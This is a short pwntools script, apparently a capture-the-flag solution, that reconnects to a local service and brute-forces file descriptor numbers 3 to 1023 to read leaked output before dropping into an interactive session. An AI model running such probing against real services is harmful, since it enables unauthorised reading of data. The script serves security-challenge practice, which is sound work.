from pwn import *
context.log_level="debug"
for i in range(3,1024):
    p = remote("0.0.0.0", 34063)
    p.recvuntil("Please input its fd:")
    p.sendline(str(i))
    p.recvline()
    print(p.recvline())
p.interactive()